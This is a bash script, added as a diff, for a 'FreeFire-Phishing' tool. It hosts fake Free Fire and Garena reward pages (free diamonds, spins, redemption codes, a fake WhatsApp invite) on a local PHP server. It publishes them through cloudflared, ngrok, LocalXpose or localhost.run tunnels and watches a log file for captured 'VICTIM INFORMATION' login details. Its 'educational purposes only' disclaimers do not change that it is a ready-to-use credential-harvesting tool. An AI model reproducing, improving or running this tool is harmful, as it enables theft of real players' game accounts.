@@ -1,0 +1,774 @@
+#!/bin/bash
+
+
+#colors code
+Black="\033[0;30m"
+Red="\033[0;31m"
+Green="\033[0;32m"
+Yellow="\033[0;33m"
+Blue="\033[0;34m"
+Purple="\033[0;35m"
+Cyan="\033[0;36m"
+White="\033[0;37m"
+
+#bold color code
+BBlack="\033[1;30m"
+BRed="\033[1;31m"
+BGreen="\033[1;32m"
+BYellow="\033[1;33m"
+BBlue="\033[1;34m"
+BPurple="\033[1;35m"
+BCyan="\033[1;36m"
+BWhite="\033[1;37m"
+
+#reset 
+Reset="\033[0m"
+
+
+
+version="1.2.1" 
+
+# chacking update 
+check_update() {
+    echo
+    echo
+    echo -ne "\n${Yellow}[${Green}+${Yellow}] ${Green}Checking for update: "
+    release_url='https://raw.githubusercontent.com/CYB3RKING/RDX_CRACK/main/version.txt'
+    new_version=$(curl -s "${release_url}")
+    if [[ "$new_version" != "$version" ]]; then
+        echo -e "${Red}Update available: ${Yellow}${new_version}\n"
+    else
+        echo -e "${Green}Up to date\n"
+    fi
+}
+############################################################################################################
+# chacking internet
+check_status() {
+    echo -ne "\n${Yellow}[${Green}+${Yellow}] ${Green}Internet Status: "
+    if timeout 3s curl -fIs "https://api.github.com" > /dev/null; then
+        echo -e "${Green}Online"
+        check_update
+    else
+        echo -e "${Red}Offline"
+    fi
+}
+############################################################################################################
+mainlogo(){
+    echo ""
+    echo -e "${Green}███████${Reset}╗${Green}██████${Reset}╗ ${Green}███████${Reset}╗${Green}███████${Reset}╗    ${Red}███████${Reset}╗${Red}██${Reset}╗${Red}██████${Reset}╗ ${Red}███████${Reset}╗ "
+    echo -e "${Green}██${Reset}╔════╝${Green}██${Reset}╔══${Green}██${Reset}╗${Green}██${Reset}╔════╝${Green}██${Reset}╔════╝    ${Red}██${Reset}╔════╝${Red}██${Reset}║${Red}██${Reset}╔══${Red}██${Reset}╗${Red}██${Reset}╔════╝  "
+    echo -e "${Green}█████${Reset}╗  ${Green}██████${Reset}╔${Reset}╝${Green}█████${Reset}╗  ${Green}█████${Reset}╗      ${Red}█████${Reset}╗  ${Red}██${Reset}║${Red}██████${Reset}╔${Reset}╝${Red}█████${Reset}╗  "
+    echo -e "${Green}██${Reset}╔══╝  ${Green}██${Reset}╔══${Green}██${Reset}╗${Green}██${Reset}╔══╝  ${Green}██${Reset}╔══╝      ${Red}██${Reset}╔══╝  ${Red}██${Reset}║${Red}██${Reset}╔══${Red}██${Reset}╗${Red}██${Reset}╔══╝  "
+    echo -e "${Green}██${Reset}║     ${Green}██${Reset}║  ${Green}██${Reset}║${Green}███████${Reset}╗${Green}███████${Reset}╗    ${Red}██${Reset}║     ${Red}██${Reset}║${Red}██${Reset}║  ${Red}██${Reset}║${Red}███████${Reset}╗"
+    echo -e "${Reset}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝"
+    echo ""
+    echo -e "            ${Yellow}[${Green}*${Yellow}] ${Green} https://github.com/CYB3RKING/FreeFire-Phishing "    
+    echo -e "            ${Yellow}[${Green}*${Yellow}] ${Green} Credit -> ${Yellow}@Online-Hacking "
+    echo ""                                                        
+}
+############################################################################################################
+logo(){
+    echo ""
+    echo -e "${Green}███████ ██████  ███████ ███████    ${Red} ███████ ██ ██████  ███████ "
+    echo -e "${Green}██      ██   ██ ██      ██         ${Red} ██      ██ ██   ██ ██      "
+    echo -e "${Green}█████   ██████  █████   █████      ${Red} █████   ██ ██████  █████   "
+    echo -e "${Green}██      ██   ██ ██      ██         ${Red} ██      ██ ██   ██ ██      "
+    echo -e "${Green}██      ██   ██ ███████ ███████     ${Red}██      ██ ██   ██ ███████  "
+    echo -e ""                                                       
+}
+############################################################################################################
+server() {
+    echo
+    clear
+    printf "\033[32m[\033[31m?\033[32m] \033[33mDo You Want A Custom Port \033[32m[\033[31mY\033[33m/\033[31mN\033[32m]\033[0m: "
+    read -n1 defaultport
+    echo
+
+    if [[ ${defaultport} =~ ^([yY])$ ]]; then
+        while true; do
+            echo
+            printf "\033[33m[\033[32m+\033[33m] \033[32mEnter Your Custom 4-digit Port \033[32m[\033[31m1024\033[33m-\033[31m9999\033[32m] :\033[33m "
+            read -n4 port
+            echo ""
+            port=${port:-8080}  #  default port 
+            if [[ "${port}" =~ ^([1-9][0-9][0-9][0-9])$ && ${port} -ge 1024 ]]; then
+                PORT=${port}
+                echo -e "${Green}[${Yellow}+${Green}] ${Yellow}Custom Port Set to ${Red}$port"
+                sleep 1
+                # echo -e "[+] Starting PHP server : 127.0.0.1$port"
+                # php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
+                break
+            else
+                clear
+                echo
+                echo -ne "\n${Green}[${Red}!${Green}] ${Yellow}Invalid 4-digit Port: ${Red}$port, ${Yellow}Try Again...\n"
+                echo
+            fi
+        done
+    else
+        port=${port:-8080}
+        echo -ne "\n\n${Green}[${Yellow}-${Green}] ${Yellow}Using Default Port ${Red}$port\n"
+        sleep 1
+       # echo -e "[+] Starting PHP server : 127.0.0.1$port"
+        #php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
+    fi
+    sleep 1
+}
+######################################################################################################3
+about() {
+    clear
+    echo -e "${Red}========================================="
+    echo -e "      ${Green}     ABOUT THIS TOOL"
+    echo -e "${Red}========================================="
+    echo -e ""
+    echo -e "${Green}Tool Name:${Yellow} Free Fire Phishing Tool"
+    echo -e "${Green}Developer: ${Yellow}@CYB3R_KING"
+    echo -e "${Green}Original Tool By: ${Yellow}@OnlineHacking"
+    echo -e ""
+    echo -e "${Red}Description:"
+    echo -e "${Cyan}This tool is designed for phishing purposes related to Free Fire."
+    echo -e "${Cyan}It is important to use this tool responsibly and ethically."
+    echo -e "${Cyan}Make sure to only use it in legal and authorized scenarios."
+    echo -e ""
+    echo -e "${Red}Disclaimer:"
+    echo -e "${Green}The developer, cyb3rking, does not endorse or support illegal activities."
+    echo -e "${Green}This tool is provided for educational purposes only. Misuse of this tool can"
+    echo -e "${Green}result in severe legal consequences. Always ensure that your activities are"
+    echo -e "${Green}compliant with local laws and regulations."
+    echo -e ""
+    echo -e "${Red}========================================="
+    echo -e " ${Green}        END OF ABOUT SECTION"
+    echo -e "${Red}========================================="
+    echo -e ""
+    echo -e "${Green}[${Yellow}1${Green}] ${Gyan}Back                   ${Green}[${Yellow}2${Green}] ${Gyan}Exit"
+    echo
+    printf "\033[32mChoice option \033[31m--> \033[0m" 
+    read abt
+    if [[ $abt == '1' ]] || [[ $abt == '01' ]]; then
+        clear
+        choiceopt
+    elif [[ $abt == '2' ]] || [[ $abt == '02' ]]; then
+        msg_exit
+    else
+        exit
+    fi
+}
+######################################################################################################3
+
+# rootchecker() {
+#     if [[ $EUID -ne 0 ]]; then
+#         echo
+#         echo
+#         echo -e "${Yellow}This tool will only work as ${Red}root${Red}."
+#         msg_exit
+#         exit 1
+#     else
+#         echo -e "${Green}You are root."
+#     fi
+# }
+
+######################################################################################################3
+msg_exit(){
+    echo
+    logo
+    echo -e " ${Green}Thanks For using this tool "
+    echo -e "  ${Yellow}Joine Channle  ${Green}->  ${Cyan}@CYB3R_KING"
+}
+
+############################################################################################################
+disclaimer(){
+    clear
+    echo ""
+	printf "                     \e[91m|===========================|
+	            [¤]   \e[1;33mD I S C L A I M E R${red}   \e[91m[¤]
+	             \e[91m|===========================|\n\n"
+			   echo ""
+    echo -e "This tool is for educational purposes only. Unauthorized use for phishing or other malicious activities is illegal and unethical. The creator disclaims all responsibility for misuse. Use this tool responsibly and only in ethical and legal contexts."
+    echo
+    printf "\033[33mAccepted This Notice \033[32m(\033[31mY\033[33m/\033[31mN\033[32m)\033[0m: "
+    read -n1 option
+    if [[ $option == 'Y' ]] || [[ $option == 'y' ]]; then
+        clear
+    else
+        exit
+    fi
+
+
+
+}
+######################################################################################################3
+homefile(){
+    cd /data/data/com.termux/files/usr/bin/.FreeFire/  #termux
+    #cd /usr/bin/.FreeFire/    #linux
+}
+############################################################################################################
+start_cloudflared() { 
+    # Check if cloudflared exists
+    if [[ ! -e cloudflared ]]; then
+        echo "${Green}[${Red}!${Green}]${Yellow}Cloudflared not found. Installing..."
+
+        # Check if wget is installed
+        command -v wget > /dev/null 2>&1 || { echo "${Green}[${Red}!${Green}]${Red}I require wget but it's not installed. Install it. Aborting.${Reset}"; exit 1; }
+
+        # Determine architecture and download the appropriate cloudflared binary
+        arch=$(uname -m)
+        if [[ $arch == *'arm'* ]]; then
+            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
+        elif [[ "$arch" == *'aarch64'* ]]; then
+            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
+        elif [[ "$arch" == *'x86_64'* ]]; then
+            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
+        else
+            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
+        fi
+
+        # Make the downloaded file executable
+        chmod +x cloudflared
+        clear
+    fi
+
+    # Start PHP server
+    echo "${Green}[${Yellow}+${Green}] ${Yellow}Starting PHP server on port: ${Red}$port"
+    php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
+    php_pid=$!
+
+    sleep 2
+
+    # Start Cloudflared tunnel
+    echo "Starting Cloudflared tunnel: 127.0.0.1:$port"
+    ./cloudflared tunnel -url 127.0.0.1:"$port" --logfile cf.log > /dev/null 2>&1 &
+    cf_pid=$!
+
+    # Clear old log file and wait for Cloudflared to generate the link
+    rm -f cf.log
+    sleep 5
+
+    # Capture the first link generated
+    clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log" | head -n 1)
+
+    # Check if the link was successfully generated
+    if [[ -z "$clink" ]]; then
+        echo "Error: Cloudflared link not generated."
+        kill $cf_pid $php_pid 2>/dev/null
+        exit 1
+    else
+            mainlogo
+            echo -e "${Yellow}=======================   ${Green}SUMAN © 2024 FF  ${Yellow}========================"
+            echo -e ""
+            echo -e "${Gyan}------------------------- > > > > > > >"
+            echo -e "${Yellow}Cloudflared : ${Red}$clink"
+            echo -e "------------------------- > > > > > > >"
+            echo -e "${Yellow}LocalHost Link : ${Red}http://127.0.0.1:$port"
+            echo -e "-${YGyan}------------------------ > > > > > > >"
+            echo -e ""
+            echo -e "${Yellow}======================= ${Red}VICTIM INFORMATION ${Yellow}======================="
+            echo -e ""
+            echo -e " ${Green}[${Red}*${Green}] ${Yellow}Waiting For Login Info, ${Red}Ctrl + C to Exit...${Yellow}"
+            echo -e ""
+    fi
+}
+############################################################################################################
+start_loclx() {
+    echo -e " "
+    rm -rf .loclx
+    echo -e ""
+    echo "${Green}[${Yellow}+${Green}} ${Yellow}Launching LocalXpose..."
+    { sleep 1; localxpose_auth; }
+    echo -e "\n"
+    echo -e ""
+
+    # Check if LocalXpose exists
+    if [[ ! -e loclx ]]; then
+        echo "${Green}[${Yellow}+${Green}} ${Yellow}LocalXpose not found. Installing..."
+
+        # Check if wget is installed
+        command -v wget > /dev/null 2>&1 || { echo "${Green}[${Yellow}+${Green}} ${Red}I require wget but it's not installed. Install it. Aborting."; exit 1; }
+
+        # Download LocalXpose based on architecture
+        arch=$(uname -m)
+        if [[ $arch == *'arm'* ]]; then
+            wget https://github.com/localxpose/localxpose/releases/latest/download/loclx-linux-arm -O loclx
+        elif [[ "$arch" == *'aarch64'* ]]; then
+            wget https://github.com/localxpose/localxpose/releases/latest/download/loclx-linux-arm64 -O loclx
+        elif [[ "$arch" == *'x86_64'* ]]; then
+            wget https://github.com/localxpose/localxpose/releases/latest/download/loclx-linux-amd64 -O loclx
+        else
+            wget https://github.com/localxpose/localxpose/releases/latest/download/loclx-linux-386 -O loclx
+        fi
+
+        # Make loclx executable
+        chmod +x loclx
+        clear
+    fi
+
+    # Start LocalXpose tunnel
+    echo "${Green}[${Yellow}+${Green}} ${Yellow}Starting LocalXpose tunnel: ${Red}127.0.0.1:$port"
+    if [[ $(command -v termux-chroot) ]]; then
+        sleep 1 && termux-chroot ./loclx tunnel --raw-mode http --https-redirect -t 127.0.0.1:$port > .loclx 2>&1 &
+    else
+        sleep 1 && ./loclx tunnel --raw-mode http --https-redirect -t 127.0.0.1:$port > .loclx 2>&1 &
+    fi
+
+    sleep 12
+    llink=$(grep -o '[0-9a-zA-Z.]*\.loclx.io' .loclx)
+
+    # Check if the link was successfully generated
+    if [[ -z "$llink" ]]; then
+        echo "Error: LocalXpose link not generated."
+        kill $(pgrep loclx) 2>/dev/null
+        exit 1
+    else
+            mainlogo
+            echo -e "${Yellow}=======================   ${Green}SUMAN © 2024 FF ${Yellow} ========================"
+            echo -e ""
+            echo -e "${Cyan}------------------------- > > > > > > >"
+            echo -e "${Yellow}LocalXpose Link : ${Red}$llink"
+            echo -e "${Cyan}------------------------- > > > > > > >"
+            echo -e "${Yellow}LocalHost Link :${Red} http://127.0.0.1:$port"
+            echo -e "${Cyan}------------------------- > > > > > > >"
+            echo -e ""
+            echo -e "${Yellow}======================= ${Green}VICTIM INFORMATION${Yellow} ======================="
+            echo -e ""
+            echo -e " ${Green}[${Yellow}*${Green}] ${Yellow}Waiting For Login Info, ${Red}Ctrl + C to Exit...${Yellow}"
+            echo -e ""
+    fi
+}
+
+
+############################################################################################################
+start_lhrlife() {
+    echo -e " "
+    rm -rf lhrlife
+    echo -e ""
+    echo "${Green}[${Yellow}+${Green}] ${Yellow}Launching lhr.Life SSH..."
+    echo -e "\n"
+    echo -e ""
+
+    # Check if lhr.Life binary exists
+    if [[ ! -e lhrlife ]]; then
+        echo "${Green}[${Yellow}*${Green}] ${Red}lhr.Life not found. ${Green}Downloading..."
+
+        # Check if wget is installed
+        command -v wget > /dev/null 2>&1 || { echo "${Green}[${Red}!${Green}] ${Red}I require wget but it's not installed. Install it. Aborting."; exit 1; }
+
+        # Download lhr.Life binary
+        wget https://example.com/path/to/lhrlife -O lhrlife  # Replace with actual URL
+
+        # Make lhrlife executable
+        chmod +x lhrlife
+        clear
+    fi
+
+    # Start lhr.Life SSH tunnel
+    echo "${Green}[${Yellow}+${Green}] ${Yellow}Starting lhr.Life SSH tunnel:${Red} 127.0.0.1:$port"
+    sleep 1 && ./lhrlife -R 80:localhost:$port nokey@localhost.run > lhrlife 2>&1 &
+
+    sleep 12
+    lhrlifelink=$(grep -o 'https://[0-9a-zA-Z.]*.lhr.life' lhrlife)
+
+    # Check if the link was successfully generated
+    if [[ -z "$lhrlifelink" ]]; then
+        echo "Error: lhr.Life link not generated."
+        kill $(pgrep lhrlife) 2>/dev/null
+        exit 1
+    else
+            mainlogo
+            echo -e "${Yellow}=======================   ${Green}SUMAN © 2024 FF  ${Yellow}========================"
+            echo -e ""
+            echo -e "${Cyan}------------------------- > > > > > > >"
+            echo -e "${Yellow}lhr.Life Link : ${Red}$lhrlifelink"
+            echo -e "${Cyan}------------------------- > > > > > > >"
+            echo -e "${Yellow}LocalHost Link :${Red} http://127.0.0.1:$port"
+            echo -e "${Cyan}------------------------- > > > > > > >"
+            echo -e ""
+            echo -e "${Yellow}======================= ${Green}VICTIM INFORMATION ${Yellow}======================="
+            echo -e ""
+            echo -e " ${Green}[${Yellow}*${Green}] ${Yellow}Waiting For Login Info, ${Red}Ctrl + C to Exit...${Yellow}"
+            echo -e ""
+    fi
+}
+
+############################################################################################################
+start_localhost(){
+        php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
+        mainlogo
+        echo -e "${Yellow}=======================   ${Green}SUMAN © 2024 FF  ${Yellow}========================"
+        echo -e ""
+        echo -e "${Cyan}------------------------- > > > > > > >"
+        echo -e "${Yellow}LocalHost Link : ${Red}http://127.0.0.1:$port"
+        echo -e "${Cyan}------------------------- > > > > > > >"
+        echo -e ""
+        echo -e "${Yellow}=======================${Green} VICTIM INFORMATION ${Yellow}======================="
+        echo -e ""
+        echo -e " ${Green}[${Yellow}*${Green}] ${Yellow}Waiting For Login Info, ${Red}Ctrl + C to Exit...${Yellow}"
+        echo -e ""
+}
+
+############################################################################################################
+start_ngrok() {
+    # Check if ngrok exists
+    if [[ ! -e ngrok ]]; then
+        echo "${Green}[${Yellow}+${Green}] ${Yellow}Ngrok not found. Installing..."
+
+        # Check if wget is installed
+        command -v wget > /dev/null 2>&1 || { echo "${Green}[${Yellow}+${Green}] ${Red}I require wget but it's not installed. Install it. Aborting."; exit 1; }
+
+        # Download Ngrok based on architecture
+        arch=$(uname -m)
+        if [[ $arch == *'arm'* ]]; then
+            wget https://bin.equinox.io/c/4b8e1b06cbb2/ngrok-stable-linux-arm.zip -O ngrok.zip
+        elif [[ "$arch" == *'aarch64'* ]]; then
+            wget https://bin.equinox.io/c/4b8e1b06cbb2/ngrok-stable-linux-arm64.zip -O ngrok.zip
+        elif [[ "$arch" == *'x86_64'* ]]; then
+            wget https://bin.equinox.io/c/4b8e1b06cbb2/ngrok-stable-linux-amd64.zip -O ngrok.zip
+        else
+            wget https://bin.equinox.io/c/4b8e1b06cbb2/ngrok-stable-linux-386.zip -O ngrok.zip
+        fi
+
+        # Unzip and make ngrok executable
+        unzip ngrok.zip
+        chmod +x ngrok
+        rm ngrok.zip
+        clear
+    fi
+
+    # Start PHP server
+    echo
+    echo "${Green}[${Yellow}+${Green}] ${Yellow}Starting PHP server on port: ${Red}$port"
+    php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
+    php_pid=$!
+
+    sleep 2
+
+    # Start Ngrok tunnel
+    echo "${Green}[${Yellow}+${Green}] ${Yellow}Starting Ngrok tunnel: ${Red}127.0.0.1:$port"
+    ./ngrok http "$port" > ngrok.log &
+    ngrok_pid=$!
+
+    # Clear old log file and wait for Ngrok to generate the link
+    sleep 5
+
+    # Capture the first link generated
+    nlink=$(grep -o 'https://[-0-9a-z]*\.ngrok.io' "ngrok.log" | head -n 1)
+
+    # Check if the link was successfully generated
+    if [[ -z "$nlink" ]]; then
+        echo "Error: Ngrok link not generated."
+        kill $ngrok_pid $php_pid 2>/dev/null
+        exit 1
+    else
+          mainlogo
+          echo -e "${Yellow}=======================   ${Green}SUMAN © 2024 FF  ${Yellow}========================"
+          echo -e ""
+          echo -e "${Cyan}------------------------- > > > > > > >"
+          echo -e "${Yellow}Ngrok Link :${Red} $nlink"
+          echo -e "------------------------- > > > > > > >"
+          echo -e "${Yellow}LocalHost Link :${Red} http://127.0.0.1:$port"
+          echo -e "${Cyan}------------------------- > > > > > > >"
+          echo -e ""
+          echo -e "${Yellow}=======================${Green} VICTIM INFORMATION ${Yellow}======================="
+          echo -e ""
+          echo -e " ${Green}[${Yellow}*${Green}] ${Yellow}Waiting For Login Info, ${Red}Ctrl + C to Exit...${Yellow}"
+          echo -e ""
+    fi
+}
+
+############################################################################################################
+start_all_services() {
+    echo -e "Starting all services..."
+    start_cloudflared
+    start_ngrok
+    start_loclx
+    start_lhrlife
+    clear
+    mainlogo
+    echo -e "${Yellow}=======================   ${Green}SUMAN © 2024 FF  ${Yellow}========================"
+    echo -e ""
+    echo -e "${Cyan}------------------------- > > > > > > >"
+    echo -e "${Yellow}Cloudflared : ${Red}$clink"
+    echo -e "${Cyan}------------------------- > > > > > > >"
+    echo -e "${Yellow}Ngrok Link :${Red} $nlink"
+    echo -e "${Cyan}------------------------- > > > > > > >"
+    echo -e "${Yellow}LocalXpose Link : ${Red}$llink"
+    echo -e "${Cyan}------------------------- > > > > > > >"
+    echo -e "${Yellow}lhr.Life Link :${Red} $lhrlifelink"
+    echo -e "${Cyan}------------------------- > > > > > > >"
+    echo -e "${Yellow}LocalHost Link :${Red} http://127.0.0.1:$port"
+    echo -e "${Cyan}------------------------- > > > > > > >"
+    echo -e ""
+    echo -e "${Yellow}=======================${Green} VICTIM INFORMATION ${Yellow}======================="
+    echo -e ""
+    echo -e " ${Green}[${Yellow}*${Green}] ${Yellow}Waiting For Login Info, ${Red}Ctrl + C to Exit...${Yellow}"
+    echo -e ""
+}
+
+
+############################################################################################################
+select_url() {
+    clear
+    echo -e "\n"
+    echo -e "${Cyan}-------------------------------------------------------------"
+    echo -e ""
+    echo -e "${Green}[${Yellow}1${Green}] ${Yellow}Cloudflare \t\t\t\t${Green}[${Red}Auto Detects${Green}]" 
+    echo -e "${Green}[${Yellow}2${Green}] ${Yellow}Ngrok \t\t\t\t${Green}[${Red}Account Token Needed${Green}]"
+    echo -e "${Green}[${Yellow}3${Green}] ${Yellow}LocalXpose \t\t\t\t${Green}[${Red}NEW! Max 15Min${Green}]"
+    echo -e "${Green}[${Yellow}4${Green}] ${Yellow}lhr.Life \t\t\t\t${Green}[${Red}NEW! Not Hotspot On${Green}]"
+    echo -e "${Green}[${Yellow}5${Green}] ${Yellow}LocalHost \t\t\t\t${Green}[${Red}Only This Devices!${Green}]"
+    echo -e "${Green}[${Yellow}6${Green}] ${Yellow}Ngrok + Cloudflare + LocalXpose + lhr.Life ${Green}[${Red}Premium User${Green}]"
+    echo -e ""
+    echo -e "${Cyan}-------------------------------------------------------------"
+    echo -e ""
+
+    read -n1 -p " select an option --> " url_option
+
+    case "$url_option" in
+        1)
+            clear
+            start_cloudflared
+            ;;
+        2)
+            clear
+            start_ngrok
+            ;;
+        3)
+            clear
+            start_loclx
+            ;;
+        4)
+            clear
+            start_lhrlife
+            ;;
+        5)
+            clear
+            start_localhost
+            ;;
+        6)
+            clear
+            start_all_services
+            ;;
+        *)
+            echo
+            echo "Invalid option. Please try again."
+            select_url
+            ;;
+    esac
+}
+
+############################################################################################################
+logo2() {
+    clear
+    mainlogo
+    echo -e "${Cyan}< < < ====================================================== > > >"
+    echo -e ""
+    echo -e "${Green}[${Yellow}01${Green}] ${Yellow}Game Kharido             ${Green}[${Yellow}06${Green}] ${Yellow}Free Fire Skin  "
+    echo -e "${Green}[${Yellow}02${Green}] ${Yellow}Garena Gift Center       ${Green}[${Yellow}07${Green}] ${Yellow}Free Fire Spin   "
+    echo -e "${Green}[${Yellow}03${Green}] ${Yellow}Magic Event Reward       ${Green}[${Yellow}08${Green}] ${Yellow}Free Coin, Diamond   "
+    echo -e "${Green}[${Yellow}04${Green}] ${Yellow}Redemption Code          ${Green}[${Yellow}09${Green}] ${Yellow}Fack WhatsApp Invite"
+    echo -e "${Green}[${Yellow}05${Green}] ${Yellow}Diamond Buy              ${Green}[${Yellow}10${Green}] ${Yellow}Choose Gift + Package Gift + Lucky Spin"
+    echo -e "${Green}[${Yellow}99${Green}] ${Yellow}Exit                     ${Green}[${Yellow}50${Green}] ${Yellow}About"
+    echo -e ""
+    echo -e " ${Cyan}< < < ====================================================== > > >"
+    echo -e ""
+}
+############################################################################################################
+choiceopt() {
+    logo2
+    echo -e " ${Cyan}┌──( ${Red}FreeFire-Phishing ${Cyan})-[ ${Reset} Choice a Option  ${Cyan}]"
+    printf  " └─> " 
+    read option
+
+   if [ "$option" = "01" ] || [ "$option" = "1" ]; then
+        clear
+        homefile
+        cd 0/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        break
+        
+    elif [ "$option" = "02" ] || [ "$option" = "2" ]; then
+        homefile
+        cd 2/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        
+        break
+        
+    elif [ "$option" = "03" ] || [ "$option" = "3" ]; then
+        # Add commands for option 03 here
+        homefile
+        cd 3/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        break
+        
+    elif [ "$option" = "04" ] || [ "$option" = "4" ]; then
+        homefile
+        cd 4/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        break
+        
+    elif [ "$option" = "05" ] || [ "$option" = "5" ]; then
+        homefile
+        cd 6/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        break
+        
+    elif [ "$option" = "06" ] || [ "$option" = "6" ]; then
+        homefile
+        cd 7/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        break
+        
+    elif [ "$option" = "07" ] || [ "$option" = "7" ]; then
+        homefile
+        cd 9/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        break
+        
+    elif [ "$option" = "08" ] || [ "$option" = "8" ]; then
+        homefile
+        cd 8/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        break
+        
+    elif [ "$option" = "09" ] || [ "$option" = "9" ]; then
+        homefile
+        cd 5/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        break
+        
+    elif [ "$option" = "10" ]; then
+        homefile
+        cd 1/
+        echo ""
+        server
+        select_url
+        
+        if [[ -e OnlineHacking.txt ]]; then
+            > OnlineHacking.txt
+        fi
+        echo ""
+        echo ""
+        tail -f OnlineHacking.txt
+        clear
+        msg_exit
+        break
+        
+    elif [ "$option" = "50" ]; then
+        # Add commands for option 50 here
+        echo "Option 50 selected: About"
+        about
+        break
+        
+    elif [ "$option" = "99" ]; then
+        clear
+        echo "Exiting..."
+        msg_exit
+        exit 0
+        
+    else
+        echo " ${Red}Invalid option. Please try again."
+    fi
+}
+clear
+# rootchecker
+echo
+check_status
+disclaimer
+choiceopt
